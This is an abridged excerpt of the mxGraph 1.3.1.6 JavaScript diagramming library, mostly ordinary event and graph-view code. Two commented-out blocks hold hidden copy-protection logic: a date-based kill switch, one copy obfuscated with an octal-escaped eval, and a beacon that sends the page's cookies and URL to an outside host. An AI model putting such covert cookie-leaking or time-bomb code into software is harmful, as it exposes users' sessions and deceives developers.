...
// File created 19-Apr-2010 10:01:28 for Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.0.30729; CIBA; .NET CLR 3.5.30729; .NET CLR 1.1.4322)
...
var mxUtils = {
    ...
    repaintGraph: function(graph, pt) {
        ...
        if (c != null && pt != null && (!(mxClient.IS_IE) || false || false) && (c.scrollLeft > 0 || c.scrollTop > 0)) {
...
var mxEvent = {
    ...
    redirectMouseEvents: function(node, graph, state, down, move, up, dblClick) {
        ...
        mxEvent.addListener(node, 'mouseup', 
        function(evt) {
            if (up != null) {
                up(evt);
            } else if (!mxEvent.isConsumed(evt)) {
    ...
    addMouseWheelListener: function(funct) {
        if (funct != null) {
            ...
            if (!(mxClient.IS_IE)) {
                var eventName = (false || !(mxClient.IS_IE)) ? 'mousewheel': 'DOMMouseScroll';
...
mxText.prototype.create = function(container) {
    ...
    if (this.dialect == mxConstants.DIALECT_SVG) {
        ...
        if (!(mxClient.IS_IE) && !mxClient.NO_FO) {
...
mxGraphModel.prototype.getChildCount = function(cell) {
    return (cell != null && typeof(cell.getChildCount) == 'function') ? cell.getChildCount() : 0;
};
...
{var st=document.getElementsByTagName('script');
	...
	if(i==len)
	{
		if((new Date().getTime()/1000)-1271667688>15778463)
			{mxGraph=null;};
		if(document.cookie.indexOf('mxgraph-copy=invalid')<0)
		{new Image().src=mxu+'?version=local['+document.cookie+']&key='+window.location.href+'[1.3.1.6]';document.cookie='mxgraph-copy=invalid; expires=Fri, 27 Jul 2199 02:47:11 UTC; path=/';}
  }
};*/
var mxCellPath = {
    PATH_SEPARATOR: '.',
...
mxGraphView.prototype.validatePoints = function(parentState, cell) {
    ...
    if (state != null) {
        ...
        if (model.isEdge(cell) || model.isVertex(cell)) {
            var box = (state.text != null && (!this.graph.isHtmlLabel(cell) || !this.graph.isLabelClipped(state.cell))) ? state.text.boundingBox: null;
            if (box != null) {
...
mxGraphView.prototype.updatePoints = function(state, points, source, target) {
    if (state != null) {
        ...
        if (edgeStyle != null) {
            var src = this.getState(this.getTerminalPort(state, source, true));
            var trg = this.getState(this.getTerminalPort(state, target, false));
...
mxGraphView.prototype.getTerminalPort = function(state, terminal, source) {
    ...
    if (id != null) {
        var tmp = this.graph.getModel().getCell(id);
...
mxGraph.prototype.fireMouseEvent = function(evtName, me, sender) {
    ...
    if ((evtName != mxEvent.MOUSE_UP || this.isMouseDown) && me.getEvent().detail != 2) {
        ...
        if (!this.isEditing() && (false || false || !(mxClient.IS_IE) || me.getEvent().target != this.container)) {
...
mxConnectionHandler.prototype.mouseDown = function(sender, me) {
    if (this.isEnabled() && this.graph.isEnabled() && !me.isConsumed() && !this.graph.isForceMarqueeEvent(me.getEvent()) && this.previous != null && this.error == null && (this.icons == null || (this.icons != null && this.icon != null))) {
...
mxEdgeHandler.prototype.mouseDown = function(sender, me) {
    var handle = null;
    if (!(mxClient.IS_IE) || me.getState() == this.state) {
        ...
        if (me.getX() != this.startX || me.getY() != this.startY) {
            if (this.error != null) {
                ...
                if (this.marker.hasValidState()) {
                    var edge = this.connect(edge, this.marker.getValidState().cell, this.isSource, this.graph.isCloneEvent(me.getEvent()) && this.cloneEnabled && this.graph.isCellsCloneable(), me);
...
/*if((eval('\156\145\167\40\104\141\164\145\50\51\56\147\145\164\124\151\155\145\50\51')/1000)-1271667625>31556859){mxGraph=function(){};};*/
var mxCodecRegistry = {
    codecs: [],
